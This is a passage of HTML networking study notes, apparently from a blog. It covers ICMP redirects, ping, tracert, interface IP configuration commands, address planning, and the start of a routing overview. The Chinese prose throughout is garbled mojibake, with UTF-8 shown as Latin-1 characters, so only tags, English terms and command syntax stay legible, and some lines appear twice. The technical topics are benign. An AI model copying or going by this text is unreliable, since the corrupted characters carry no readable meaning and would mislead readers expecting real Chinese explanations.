ICMPå…è®¸ä¸»æœºæˆ–è®¾å¤‡æŠ¥å‘Šå·®é”™æƒ…å†µå’Œæä¾›æœ‰å…³å¼‚å¸¸æƒ…å†µçš„æŠ¥å‘Šã€‚</li></ul><ul><li><p>ICMPæ¶ˆæ¯ï¼š</p><ul><li>ICMPæ¶ˆæ¯å°è£…åœ¨IPæŠ¥æ–‡ä¸­ï¼ŒIPæŠ¥æ–‡å¤´éƒ¨Protocolå€¼ä¸º1æ—¶è¡¨ç¤ºICMPåè®®ã€‚</li><li>å­—æ®µè§£é‡Šï¼š<ul><li>ICMPæ¶ˆæ¯çš„æ ¼å¼å–å†³äºTypeå’ŒCodeå­—æ®µï¼Œå…¶ä¸­Typeå­—æ®µä¸ºæ¶ˆæ¯ç±»å‹ï¼ŒCodeå­— æ®µåŒ…å«è¯¥æ¶ˆæ¯ç±»å‹çš„å…·ä½“å‚æ•°ã€‚</li><li>æ ¡éªŒå’Œå­—æ®µç”¨äºæ£€æŸ¥æ¶ˆæ¯æ˜¯å¦å®Œæ•´ã€‚</li><li>æ¶ˆæ¯ä¸­åŒ…å«32 bitçš„å¯å˜å‚æ•°ï¼Œè¿™ä¸ªå­—æ®µä¸€èˆ¬ä¸ä½¿ç”¨ï¼Œé€šå¸¸è®¾ç½®ä¸º0ã€‚<ul><li>åœ¨ICMPé‡å®šå‘æ¶ˆæ¯ä¸­ï¼Œè¿™ä¸ªå­—æ®µç”¨æ¥æŒ‡å®šç½‘å…³IPåœ°å€ï¼Œä¸»æœºæ ¹æ®è¿™ä¸ªåœ° å€å°†æŠ¥æ–‡é‡å®šå‘åˆ°æŒ‡å®šç½‘å…³ã€‚</li><li>åœ¨Echoè¯·æ±‚æ¶ˆæ¯ä¸­ï¼Œè¿™ä¸ªå­—æ®µåŒ…å«æ ‡è¯†ç¬¦å’Œåºå·ï¼Œæºç«¯æ ¹æ®è¿™ä¸¤ä¸ªå‚æ•° å°†æ”¶åˆ°çš„å›å¤æ¶ˆæ¯ä¸æœ¬ç«¯å‘é€çš„Echoè¯·æ±‚æ¶ˆæ¯è¿›è¡Œå…³è”ã€‚å°¤å…¶æ˜¯å½“æºç«¯ å‘ç›®çš„ç«¯å‘é€äº†å¤šä¸ªEchoè¯·æ±‚æ¶ˆæ¯æ—¶ï¼Œéœ€è¦æ ¹æ®æ ‡è¯†ç¬¦å’Œåºå·å°†Echoè¯· æ±‚å’Œå›å¤æ¶ˆæ¯è¿›è¡Œä¸€ä¸€å¯¹åº”</li></ul></li></ul></li></ul></li></ul><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220130202630726.png" alt="image-20220130202630726"></p><h4 id="ICMPé‡å®šå‘"><a href="#ICMPé‡å®šå‘" class="headerlink" title="ICMPé‡å®šå‘"></a>ICMPé‡å®šå‘</h4><p>ICMPé‡å®šå‘æŠ¥æ–‡æ˜¯ICMPæ§åˆ¶æŠ¥æ–‡ä¸­çš„ä¸€ç§ã€‚åœ¨ç‰¹å®šçš„æƒ…å†µä¸‹ï¼Œå½“è·¯ç”±å™¨æ£€æµ‹åˆ°ä¸€å°æœºå™¨ä½¿ç”¨éæœ€ä¼˜è·¯ç”±çš„æ—¶å€™ï¼Œå®ƒä¼šå‘è¯¥ä¸»æœºå‘é€ä¸€ä¸ªICMPé‡å®šå‘æŠ¥æ–‡ï¼Œè¯·æ±‚ä¸»æœºæ”¹å˜è·¯ç”±</p><p>è¿‡ç¨‹ï¼š</p><ul><li>ä¸»æœºAå¸Œæœ›å‘é€æŠ¥æ–‡åˆ°æœåŠ¡å™¨Aï¼Œäºæ˜¯æ ¹æ®é…ç½®çš„é»˜è®¤ç½‘å…³åœ°å€å‘ç½‘å…³RTBå‘é€æŠ¥æ–‡ã€‚</li><li>ç½‘å…³RTBæ”¶åˆ°æŠ¥æ–‡åï¼Œæ£€æŸ¥æŠ¥æ–‡ä¿¡æ¯ï¼Œå‘ç°æŠ¥æ–‡åº”è¯¥è½¬å‘åˆ°ä¸æºä¸»æœºåœ¨åŒä¸€ç½‘æ®µçš„å¦ ä¸€ä¸ªç½‘å…³è®¾å¤‡RTAï¼Œæ­¤è½¬å‘è·¯å¾„æ˜¯æ›´ä¼˜çš„è·¯å¾„ï¼Œæ‰€ä»¥RTBä¼šå‘ä¸»æœºå‘é€ä¸€ä¸ªRedirect æ¶ˆæ¯ï¼Œé€šçŸ¥ä¸»æœºç›´æ¥å‘å¦ä¸€ä¸ªç½‘å…³RTAå‘é€è¯¥æŠ¥æ–‡ã€‚</li><li>ä¸»æœºæ”¶åˆ°Redirectæ¶ˆæ¯åï¼Œä¼šå‘RTAå‘é€æŠ¥æ–‡ï¼Œç„¶åRTAä¼šå°†è¯¥æŠ¥æ–‡å†è½¬å‘ç»™æœåŠ¡å™¨ A</li></ul><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220130205207831.png" alt="image-20220130205207831"></p><h3 id="ICMPå·®é”™æ£€æµ‹"><a href="#ICMPå·®é”™æ£€æµ‹" class="headerlink" title="ICMPå·®é”™æ£€æµ‹"></a>ICMPå·®é”™æ£€æµ‹</h3><p>ICMP Echoæ¶ˆæ¯å¸¸ç”¨äºè¯Šæ–­æºå’Œç›®çš„åœ°ä¹‹é—´çš„ç½‘ç»œè¿é€šæ€§ï¼ŒåŒæ—¶è¿˜å¯ä»¥æä¾›å…¶ä»–ä¿¡æ¯ï¼Œå¦‚æŠ¥æ–‡å¾€è¿”æ—¶é—´ç­‰</p><p>ICMPçš„ä¸€ä¸ªå…¸å‹åº”ç”¨æ˜¯Pingã€‚Pingæ˜¯æ£€æµ‹ç½‘ç»œè¿é€šæ€§çš„å¸¸ç”¨å·¥å…·ï¼ŒåŒæ—¶ä¹Ÿèƒ½å¤Ÿæ”¶é›†å…¶ä»–ç›¸ å…³ä¿¡æ¯ã€‚ç”¨æˆ·å¯ä»¥åœ¨Pingå‘½ä»¤ä¸­æŒ‡å®šä¸åŒå‚æ•°ï¼Œå¦‚ICMPæŠ¥æ–‡é•¿åº¦ã€å‘é€çš„ICMPæŠ¥æ–‡ä¸ªæ•°ã€ ç­‰å¾…å›å¤å“åº”çš„è¶…æ—¶æ—¶é—´ç­‰ï¼Œè®¾å¤‡æ ¹æ®é…ç½®çš„å‚æ•°æ¥æ„é€ å¹¶å‘é€ICMPæŠ¥æ–‡ï¼Œè¿›è¡ŒPingæµ‹è¯•ã€‚pingå¸¸ç”¨äºæ¢æµ‹åˆ°è¾¾ç›®çš„èŠ‚ç‚¹çš„ç½‘ç»œå¯è¾¾æ€§</p><h3 id="ICMPé”™è¯¯æŠ¥å‘Š"><a href="#ICMPé”™è¯¯æŠ¥å‘Š" class="headerlink" title="ICMPé”™è¯¯æŠ¥å‘Š"></a>ICMPé”™è¯¯æŠ¥å‘Š</h3><p>ICMPå®šä¹‰äº†å„ç§é”™è¯¯æ¶ˆæ¯ï¼Œç”¨äºè¯Šæ–­ç½‘ç»œè¿æ¥æ€§é—®é¢˜ï¼›æ ¹æ®è¿™äº›é”™è¯¯æ¶ˆæ¯ï¼Œæºè®¾å¤‡å¯ä»¥åˆ¤ æ–­å‡ºæ•°æ®ä¼ è¾“å¤±è´¥çš„åŸå› ã€‚</p><ul><li>å¦‚æœç½‘ç»œä¸­å‘ç”Ÿäº†ç¯è·¯ï¼Œå¯¼è‡´æŠ¥æ–‡åœ¨ç½‘ç»œä¸­å¾ªç¯ï¼Œä¸”æœ€ç»ˆTTLè¶…æ—¶ï¼Œè¿™ç§æƒ…å†µä¸‹ç½‘ç»œ è®¾å¤‡ä¼šå‘é€TTLè¶…æ—¶æ¶ˆæ¯ç»™å‘é€ç«¯è®¾å¤‡ã€‚</li><li>å¦‚æœç›®çš„åœ°ä¸å¯è¾¾ï¼Œåˆ™ä¸­é—´çš„ç½‘ç»œè®¾å¤‡ä¼šå‘é€ç›®çš„ä¸å¯è¾¾æ¶ˆæ¯ç»™å‘é€ç«¯è®¾å¤‡ã€‚ç›®çš„ä¸ å¯è¾¾çš„æƒ…å†µæœ‰å¤šç§ï¼Œå¦‚æœæ˜¯ç½‘ç»œè®¾å¤‡æ— æ³•æ‰¾åˆ°ç›®çš„ç½‘ç»œï¼Œåˆ™å‘é€ç›®çš„ç½‘ç»œä¸å¯è¾¾æ¶ˆæ¯ï¼› å¦‚æœç½‘ç»œè®¾å¤‡æ— æ³•æ‰¾åˆ°ç›®çš„ç½‘ç»œä¸­çš„ç›®çš„ä¸»æœºï¼Œåˆ™å‘é€ç›®çš„ä¸»æœºä¸å¯è¾¾æ¶ˆæ¯ã€‚</li></ul><p>ICMPçš„å¦ä¸€ä¸ªå…¸å‹åº”ç”¨æ˜¯Tracertã€‚<strong>TracertåŸºäºæŠ¥æ–‡å¤´ä¸­çš„TTLå€¼æ¥é€è·³è·Ÿè¸ªæŠ¥æ–‡çš„è½¬å‘è·¯å¾„ã€‚</strong>ä¸ºäº†è·Ÿè¸ªåˆ°è¾¾æŸç‰¹å®šç›®çš„åœ°å€çš„è·¯å¾„ï¼Œæºç«¯é¦–å…ˆå°†æŠ¥æ–‡çš„TTLå€¼è®¾ç½®ä¸º1ã€‚è¯¥æŠ¥æ–‡åˆ°è¾¾ç¬¬ä¸€ä¸ªèŠ‚ç‚¹åï¼ŒTTLè¶…æ—¶ï¼Œäºæ˜¯è¯¥èŠ‚ç‚¹å‘æºç«¯å‘é€TTLè¶…æ—¶æ¶ˆæ¯ï¼Œæ¶ˆæ¯ä¸­æºå¸¦æ—¶é—´æˆ³ã€‚ç„¶å æºç«¯å°†æŠ¥æ–‡çš„TTLå€¼è®¾ç½®ä¸º2ï¼ŒæŠ¥æ–‡åˆ°è¾¾ç¬¬äºŒä¸ªèŠ‚ç‚¹åè¶…æ—¶ï¼Œè¯¥èŠ‚ç‚¹åŒæ ·è¿”å›TTLè¶…æ—¶æ¶ˆæ¯ï¼Œ ä»¥æ­¤ç±»æ¨ï¼Œç›´åˆ°æŠ¥æ–‡åˆ°è¾¾ç›®çš„åœ°ã€‚è¿™æ ·ï¼Œæºç«¯æ ¹æ®è¿”å›çš„æŠ¥æ–‡ä¸­çš„ä¿¡æ¯å¯ä»¥è·Ÿè¸ªåˆ°æŠ¥æ–‡ç» è¿‡çš„æ¯ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå¹¶æ ¹æ®æ—¶é—´æˆ³ä¿¡æ¯è®¡ç®—å¾€è¿”æ—¶é—´ã€‚Tracertæ˜¯æ£€æµ‹ç½‘ç»œä¸¢åŒ…å’Œæ—¶å»¶çš„æœ‰æ•ˆæ‰‹æ®µï¼ŒåŒæ—¶å¯ä»¥å¸®åŠ©ç®¡ç†æºå‘ç°ç½‘ç»œä¸­çš„è·¯ç”±ç¯è·¯</p><h2 id="IPV4åœ°å€é…ç½®åŠåŸºæœ¬åº”ç”¨"><a href="#IPV4åœ°å€é…ç½®åŠåŸºæœ¬åº”ç”¨" class="headerlink" title="IPV4åœ°å€é…ç½®åŠåŸºæœ¬åº”ç”¨"></a>IPV4åœ°å€é…ç½®åŠåŸºæœ¬åº”ç”¨</h2><h3 id="IPåœ°å€çš„åŸºç¡€é…ç½®å‘½ä»¤"><a href="#IPåœ°å€çš„åŸºç¡€é…ç½®å‘½ä»¤" class="headerlink" title="IPåœ°å€çš„åŸºç¡€é…ç½®å‘½ä»¤"></a>IPåœ°å€çš„åŸºç¡€é…ç½®å‘½ä»¤</h3><p><strong>è¿›å…¥æ¥å£è§†å›¾ï¼š</strong></p><pre class="language-none"><code class="language-none">interface interface-type interface-number</code></pre><p>*interface-type interface-number:*æŒ‡å®šæ¥å£ç±»å‹å’Œæ¥å£ç¼–å·ã€‚æ¥å£ç±»å‹å’Œæ¥å£ç¼–å·ä¹‹é—´å¯ä»¥è¾“å…¥ç©ºæ ¼ä¹Ÿå¯ä»¥ä¸è¾“</p><p><strong>é…ç½®æ¥å£çš„IPåœ°å€</strong></p><pre class="language-none"><code class="language-none">ip address ip-address&#123;mask|mask-length&#125;</code></pre><p>åœ¨æ¥å£è§†å›¾ä¸‹ï¼Œé€šè¿‡æ­¤å‘½ä»¤æ¥ç»™ç½‘ç»œè®¾å¤‡ä¸Šçš„æ¥å£é…ç½®ipåœ°å€ï¼Œå®ç°ç½‘ç»œçš„äº’è¿ã€‚</p><p>ip-addressï¼šæŒ‡å®šæ¥å£çš„ipåœ°å€ï¼Œç‚¹åˆ†åè¿›åˆ¶å½¢å¼</p><p>maskï¼šæŒ‡å®šå­ç½‘æ©ç ï¼Œç‚¹åˆ†åè¿›åˆ¶å½¢å¼</p><p>mask-lengthï¼šæŒ‡å®šæ©ç é•¿åº¦ï¼Œæ•´æ•°å½¢å¼ï¼Œå–å€¼èŒƒå›´æ˜¯0-32.</p><h3 id="æ¡ˆä¾‹ï¼šé…ç½®æ¥å£ipåœ°å€"><a href="#æ¡ˆä¾‹ï¼šé…ç½®æ¥å£ipåœ°å€" class="headerlink" title="æ¡ˆä¾‹ï¼šé…ç½®æ¥å£ipåœ°å€"></a>æ¡ˆä¾‹ï¼šé…ç½®æ¥å£ipåœ°å€</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220130214110005.png" alt="image-20220130214110005"></p><ul><li>ç‰©ç†æ¥å£ï¼šç‰©ç†æ¥å£æ˜¯æŒ‡ç½‘ç»œè®¾å¤‡ä¸Šå®é™…å­˜åœ¨çš„æ¥å£ï¼Œåˆ†ä¸ºè´Ÿè´£æ‰¿æ‹…ä¸šåŠ¡ä¼ è¾“çš„ä¸šåŠ¡æ¥å£ å’Œè´Ÿè´£ç®¡ç†è®¾å¤‡çš„ç®¡ç†æ¥å£ï¼Œä¾‹å¦‚GEä¸šåŠ¡æ¥å£å’ŒMEthç®¡ç†æ¥å£ã€‚</li><li>é€»è¾‘æ¥å£ï¼šé€»è¾‘æ¥å£æ˜¯æŒ‡èƒ½å¤Ÿå®ç°æ•°æ®äº¤æ¢åŠŸèƒ½ä½†ç‰©ç†ä¸Šä¸å­˜åœ¨ã€éœ€è¦é€šè¿‡é…ç½®å»ºç«‹çš„æ¥ å£ï¼Œéœ€è¦æ‰¿æ‹…ä¸šåŠ¡ä¼ è¾“ï¼Œä¾‹å¦‚VLANIFæ¥å£ã€Loopbackæ¥å£ã€‚<ul><li>Loopbackæ¥å£ï¼šç”¨æˆ·éœ€è¦ä¸€ä¸ªæ¥å£çŠ¶æ€æ°¸è¿œæ˜¯Upçš„æ¥å£çš„IPåœ°å€æ—¶ï¼Œå¯ä»¥é€‰æ‹© Loopbackæ¥å£çš„IPåœ°å€ã€‚<ul><li>Loopbackæ¥å£ï¼šç”¨æˆ·éœ€è¦ä¸€ä¸ªæ¥å£çŠ¶æ€æ°¸è¿œæ˜¯Upçš„æ¥å£çš„IPåœ°å€æ—¶ï¼Œå¯ä»¥é€‰æ‹© Loopbackæ¥å£çš„IPåœ°å€ã€‚</li><li>Loopbackæ¥å£é…ç½®IPåœ°å€åï¼Œå°±å¯ä»¥å¯¹å¤–å‘å¸ƒã€‚Loopbackæ¥å£ä¸Šå¯ä»¥é…ç½®32ä½ æ©ç çš„IPåœ°å€ï¼Œè¾¾åˆ°èŠ‚çœåœ°å€ç©ºé—´çš„ç›®çš„ã€‚</li><li>Loopbackæ¥å£ä¸èƒ½å°è£…ä»»ä½•é“¾è·¯å±‚åè®®ï¼Œæ•°æ®é“¾è·¯å±‚ä¹Ÿå°±ä¸å­˜åœ¨åå•†é—®é¢˜ï¼Œå…¶ åè®®çŠ¶æ€æ°¸è¿œéƒ½æ˜¯Upã€‚</li><li>å¯¹äºç›®çš„åœ°å€ä¸æ˜¯æœ¬åœ°IPåœ°å€ï¼Œå‡ºæ¥å£æ˜¯æœ¬åœ°Loopbackæ¥å£çš„æŠ¥æ–‡ï¼Œè®¾å¤‡ä¼šå°† å…¶ç›´æ¥ä¸¢å¼ƒã€‚</li></ul></li></ul></li></ul><h3 id="ç½‘ç»œIPåœ°å€è§„åˆ’"><a href="#ç½‘ç»œIPåœ°å€è§„åˆ’" class="headerlink" title="ç½‘ç»œIPåœ°å€è§„åˆ’"></a>ç½‘ç»œIPåœ°å€è§„åˆ’</h3><p>è§„åˆ’ç›®æ ‡ï¼šæ˜“ç®¡ç†ã€æ˜“æ‰©å±•ã€åˆ©ç”¨ç‡é«˜ã€‚</p><p>è§„åˆ’åŸåˆ™ï¼š</p><ul><li>å”¯ä¸€æ€§ï¼šä¸€ä¸ªIPç½‘ç»œä¸­ä¸èƒ½æœ‰ä¸¤ä¸ªä¸»æœºé‡‡ç”¨ç›¸åŒçš„IPåœ°å€ã€‚</li><li>è¿ç»­æ€§ï¼šè¿ç»­åœ°å€åœ¨å±‚æ¬¡ç»“æ„ç½‘ç»œä¸­æ˜“äºè¿›è¡Œè·¯ç”±æ±‡æ€»ï¼Œå¤§å¤§ç¼©å‡è·¯ç”±è¡¨ï¼Œæé«˜è·¯ç”± è®¡ç®—çš„æ•ˆç‡ã€åŠ é€Ÿè·¯ç”±æ”¶æ•›ã€‚</li><li>æ‰©å±•æ€§ï¼šåœ°å€åˆ†é…åœ¨æ¯ä¸€å±‚æ¬¡ä¸Šéƒ½è¦æœ‰åˆç†çš„é¢„ç•™ï¼Œåœ¨ç½‘ç»œè§„æ¨¡æ‰©å±•æ—¶èƒ½ä¿è¯è·¯ç”±æ±‡ æ€»æ‰€éœ€çš„è¿ç»­æ€§ã€‚é¿å…ç½‘ç»œæ‰©å±•é€ æˆçš„åœ°å€ã€è·¯ç”±é‡æ–°è§„åˆ’ã€‚</li><li>ç»“æ„åŒ–ã€ä¸šåŠ¡ç›¸å…³æ€§ï¼šåœ°å€è§„åˆ’ä¸ç½‘ç»œæ‹“æ‰‘ç»“æ„å’Œç½‘ç»œæ‰¿è½½ä¸šåŠ¡ç»“åˆèµ·æ¥ï¼Œä¾¿äºè·¯ç”± è§„åˆ’å’ŒQoSéƒ¨ç½²ã€‚å¥½çš„IPåœ°å€è§„åˆ’ä½¿å¾—æ¯ä¸ªåœ°å€éƒ½å…·æœ‰å®é™…å«ä¹‰ï¼Œçœ‹åˆ°ä¸€ä¸ªåœ°å€å°±å¯ ä»¥å¤§è‡´åˆ¤æ–­å‡ºè¯¥åœ°å€æ‰€å±çš„è®¾å¤‡å’Œå¯¹åº”çš„ä¸šåŠ¡ã€‚</li></ul><h1 id="IPè·¯ç”±åŸºç¡€"><a href="#IPè·¯ç”±åŸºç¡€" class="headerlink" title="IPè·¯ç”±åŸºç¡€"></a>IPè·¯ç”±åŸºç¡€</h1><h2 id="è·¯ç”±æ¦‚è¿°"><a href="#è·¯ç”±æ¦‚è¿°" class="headerlink" title="è·¯ç”±æ¦‚è¿°"></a>è·¯ç”±æ¦‚è¿°</h2><ul><li>å½“è·¯ç”±å™¨ä»å¤šç§ä¸åŒçš„é€”å¾„è·çŸ¥åˆ°è¾¾åŒä¸€ä¸ªç›®çš„ç½‘æ®µçš„è·¯ç”±(è¿™äº›è·¯ç”±çš„ç›®çš„ç½‘ç»œåœ°å€åŠç½‘ç»œæ©ç å‡ç›¸åŒ)æ—¶ï¼Œä¼šä¼˜å…ˆè·¯ç”±ä¼˜å…ˆçº§å€¼æœ€å°çš„è·¯ç”±ï¼›å¦‚æœè¿™äº›è·¯ç”±å­¦ä¹ è‡ªç›¸åŒçš„è·¯ç”±åè®®ï¼Œåˆ™ä¼˜é€‰åº¦é‡å€¼æœ€ä¼˜çš„ã€‚æ€»ä¹‹ï¼Œ<strong>æœ€ä¼˜çš„è·¯ç”±åŠ å…¥è·¯ç”±è¡¨</strong></li><li>å½“è·¯ç”±å™¨æ”¶åˆ°ä¸€ä¸ªæ•°æ®åŒ…æ—¶ï¼Œä¼šåœ¨è‡ªå·±çš„è·¯ç”±è¡¨é‡ŒæŸ¥è¯¢æ•°æ®åŒ…çš„ç›®çš„IPåœ°å€ï¼Œå¦‚æœèƒ½å¤Ÿæ‰¾åˆ°åŒ¹é…çš„è·¯ç”±è¡¨é¡¹ï¼Œåˆ™ä¾æ®è¡¨é¡¹æ‰€æŒ‡ç¤ºçš„å‡ºæ¥å£åŠä¸‹ä¸€è·³æ¥è½¬å‘æ•°æ®ï¼›å¦‚æœæ²¡æœ‰åŒ¹é…çš„è¡¨ç°åˆ™ä¸¢å¼ƒè¯¥æ•°æ®åŒ…</li><li>è·¯ç”±å™¨çš„è¡Œä¸ºæ˜¯é€çº§è·³çš„ï¼Œæ•°æ®åŒ…ä»æºåˆ°ç›®çš„åœ°æ²¿è·¯å¾„æ¯ä¸ªè·¯ç”±å™¨éƒ½å¿…é¡»æœ‰å…³äºç›®æ ‡ç½‘æ®µçš„è·¯ç”±ï¼Œå¦åˆ™å°±ä¼šé€ æˆä¸¢åŒ…</li><li>æ•°æ®é€šä¿¡å¾€å¾€æ˜¯åŒå‘çš„ï¼Œå› æ­¤è¦å…³æ³¨æµé‡çš„å¾€è¿”(å¾€è¿”è·¯ç”±)</li></ul><h3 id="è·¯ç”±åŸºæœ¬æ¦‚å¿µ"><a href="#è·¯ç”±åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="è·¯ç”±åŸºæœ¬æ¦‚å¿µ"></a>è·¯ç”±åŸºæœ¬æ¦‚å¿µ</h3><p>é€šè¿‡IPåœ°å€èƒ½å¤Ÿå¯»æ‰¾åˆ°ä¸€ä¸ªå”¯ä¸€çš„ç½‘ç»œèŠ‚ç‚¹ï¼Œæ¯ä¸ªIPéƒ½æœ‰è‡ªå·±æ‰€å±çš„ç½‘æ®µï¼Œè¿™äº›ç½‘ç»œå¯èƒ½åˆ† å¸ƒåœ¨ä¸–ç•Œå„åœ°ï¼Œå…±åŒç»„æˆäº†å…¨çƒçš„ç½‘ç»œã€‚</p><p>ä¸ºäº†å®ç°ä¸åŒç½‘æ®µä¹‹é—´çš„ç›¸äº’é€šä¿¡ï¼Œç½‘ç»œè®¾å¤‡éœ€è¦èƒ½å¤Ÿè½¬å‘æ¥è‡ªä¸åŒç½‘æ®µçš„IPæŠ¥æ–‡ï¼Œå°†å…¶é€ è¾¾ä¸åŒçš„IPç½‘æ®µ</p><p><strong>è·¯ç”±</strong></p><ul><li>è·¯ç”±æ˜¯æŒ‡å¯¼æŠ¥æ–‡è½¬å‘çš„è·¯å¾„ä¿¡æ¯ï¼Œé€šè¿‡è·¯ç”±å¯ä»¥ç¡®è®¤è½¬å‘IPæŠ¥æ–‡çš„è·¯å¾„</li><li>è·¯ç”±è®¾å¤‡æ˜¯ä¾æ®è·¯ç”±è½¬å‘æŠ¥æ–‡åˆ°ç›®çš„ç½‘æ®µçš„ç½‘ç»œè®¾å¤‡ï¼Œæœ€å¸¸è§çš„è·¯ç”±è®¾å¤‡ï¼šè·¯ç”±å™¨</li><li>è·¯ç”±è®¾å¤‡ç»´æŠ¤ç€ä¸€å¼ è·¯ç”±è¡¨ï¼Œä¿å­˜ç€è·¯ç”±ä¿¡æ¯</li><li> ç½‘å…³ä»¥åŠä¸­é—´èŠ‚ç‚¹ï¼ˆè·¯ç”±å™¨ï¼‰æ ¹æ®æ”¶åˆ°çš„IPæŠ¥æ–‡å…¶ç›®çš„åœ°å€é€‰æ‹©ä¸€æ¡åˆé€‚çš„è·¯å¾„ï¼Œå¹¶å°†æŠ¥æ–‡ è½¬å‘åˆ°ä¸‹ä¸€ä¸ªè·¯ç”±å™¨ã€‚åœ¨è·¯å¾„ä¸­çš„æœ€åä¸€è·³è·¯ç”±å™¨äºŒå±‚å¯»å€å°†æŠ¥æ–‡è½¬å‘ç»™ç›®çš„ä¸»æœºã€‚è¿™ä¸ª è¿‡ç¨‹è¢«ç§°ä¸ºè·¯ç”±è½¬å‘ã€‚</li><li>ä¸­é—´èŠ‚ç‚¹é€‰æ‹©è·¯å¾„æ‰€ä¾èµ–çš„è¡¨é¡¹ä¸ºç§°ä¸ºè·¯ç”±è¡¨ã€‚</li><li>è·¯ç”±æ¡ç›®åŒ…å«æ˜ç¡®çš„å‡ºæ¥å£ä»¥åŠä¸‹ä¸€è·³ï¼Œè¿™ä¸¤é¡¹ä¿¡æ¯æŒ‡å¯¼IPæŠ¥æ–‡è½¬å‘åˆ°ç›¸åº”çš„ä¸‹ä¸€è·³è®¾å¤‡ä¸Š</li></ul><p><strong>è·¯ç”±ä¿¡æ¯</strong></p><p><strong>ç›®çš„ç½‘ç»œï¼š</strong>æ ‡è¯†ç›®çš„ç½‘æ®µ</p><p><strong>æ©ç ï¼š</strong>ä¸ç›®çš„åœ°å€å…±åŒæ ‡è¯†ä¸€ä¸ªç½‘æ®µ</p><p><strong>å‡ºæ¥å£ï¼š</strong>æ•°æ®åŒ…è¢«è·¯ç”±åç¦»å¼€æœ¬è·¯ç”±çš„æ¥å£</p><p><strong>ä¸‹ä¸€è·³ï¼š</strong>è·¯ç”±å™¨è½¬å‘åˆ°è¾¾ç›®çš„ç½‘æ®µçš„æ•°æ®åŒ…æ‰€ä½¿ç”¨çš„ä¸‹ä¸€è·³åœ°å€</p><p>è¿™äº›ä¿¡æ¯æ ‡è¯†äº†ç›®çš„ç½‘æ®µã€æ˜ç¡®äº†è½¬å‘ipæŠ¥æ–‡çš„è·¯å¾„</p><ul><li>é€šè¿‡è·¯ç”±ä¸­åŒ…å«çš„ä¿¡æ¯ï¼Œè·¯ç”±è®¾å¤‡å¯ä»¥è½¬å‘IPæŠ¥æ–‡åˆ°ç›¸åº”çš„è·¯å¾„ã€‚</li><li>ç›®çš„åœ°å€ã€æ©ç ç”¨äºè¯†åˆ«IPæŠ¥æ–‡ç›®çš„åœ°å€ï¼Œè·¯ç”±è®¾å¤‡å°†IPæŠ¥æ–‡åŒ¹é…åˆ°ç›¸åº”çš„è·¯ç”±ä¹‹åï¼Œæ ¹æ® è·¯ç”±çš„å‡ºæ¥å£ã€ä¸‹ä¸€è·³ç¡®è®¤è½¬å‘çš„è·¯å¾„ã€‚</li><li>åªæœ‰å‡ºæ¥å£å¹¶ä¸èƒ½å¤Ÿç¡®è®¤è½¬å‘IPæŠ¥æ–‡çš„ä¸‹ä¸€è·³è®¾å¤‡ï¼Œè¿˜éœ€è¦æ˜ç¡®çš„ä¸‹ä¸€è·³è®¾å¤‡åœ°å€ã€‚</li></ul><p><strong>è·¯ç”±è¡¨</strong></p><ul><li>è·¯ç”±å™¨é€šè¿‡å„ç§æ–¹å¼å‘ç°è·¯ç”±</li><li>è·¯ç”±å™¨é€‰æ‹©æœ€ä¼˜çš„è·¯ç”±æ¡ç›®æ”¾å…¥è·¯ç”±è¡¨ä¸­</li><li>è·¯ç”±å™¨æŒ‡å¯¼è®¾å¤‡å¯¹ipæŠ¥æ–‡çš„è½¬å‘</li><li>è·¯ç”±å™¨é€šè¿‡å¯¹è·¯ç”±è¡¨çš„ç®¡ç†å®ç°å¯¹è·¯å¾„çš„ä¿¡æ¯ç®¡ç†</li><li>è·¯ç”±å™¨ä¾æ®è·¯ç”±è¡¨è½¬å‘æŠ¥æ–‡ã€‚</li><li>è·¯ç”±è¡¨ç”±ä¸€æ¡æ¡è¯¦ç»†çš„è·¯ç”±æ¡ç›®ç»„æˆã€‚</li><li>è·¯ç”±è¡¨ç”±è·¯ç”±æ¡ç›®ç»„æˆï¼Œä½†ä¸ä»£è¡¨è·¯ç”±è¡¨ä¸­ä¿å­˜äº†æ‰€æœ‰è·¯ç”±ï¼Œè·¯ç”±è¡¨ä¸­åªä¼šä¿å­˜â€œæœ€ä¼˜çš„â€ è·¯ç”±ã€‚</li><li>å¯¹è·¯ç”±è¡¨ä¸­çš„è·¯ç”±æ¡ç›®çš„ç®¡ç†å®é™…ä¸Šå°±æ˜¯è·¯ç”±å™¨ç»´æŠ¤ã€ç®¡ç†è·¯ç”±ä¿¡æ¯çš„å…·ä½“å®ç°</li></ul><h3 id="è·¯ç”±æ¡ç›®ç”Ÿæˆ"><a href="#è·¯ç”±æ¡ç›®ç”Ÿæˆ" class="headerlink" title="è·¯ç”±æ¡ç›®ç”Ÿæˆ"></a>è·¯ç”±æ¡ç›®ç”Ÿæˆ</h3><p><strong>è·¯ç”±ä¿¡æ¯è·å–æ–¹å¼</strong></p><p>è·¯ç”±å™¨ä¾æ®è·¯ç”±è¡¨è¿›è¡Œè·¯ç”±è½¬å‘ï¼Œä¸ºå®ç°è·¯ç”±è½¬å‘ï¼Œè·¯ç”±å™¨éœ€è¦å‘ç°è·¯ç”±ã€‚å¸¸è§çš„æœ‰ç›´è¿è·¯ç”±ã€é™æ€è·¯ç”±å’ŒåŠ¨æ€è·¯ç”±</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220206223048985.png" alt="image-20220206223048985"></p><p>ç›´è¿æ¥å£æ‰€åœ¨ç½‘æ®µçš„è·¯ç”±ï¼Œç”±è®¾å¤‡è‡ªåŠ¨ç”Ÿæˆã€‚</p><p>ç›´è¿æ¥å£æ‰€åœ¨ç½‘æ®µçš„è·¯ç”±ï¼Œç”±è®¾å¤‡è‡ªåŠ¨ç”Ÿæˆã€‚</p><p>åŠ¨æ€è·¯ç”±ï¼šè·¯ç”±å™¨é€šè¿‡åŠ¨æ€è·¯ç”±åè®®ï¼ˆå¦‚OSPFã€IS-ISã€BGPç­‰ï¼‰å­¦ä¹ 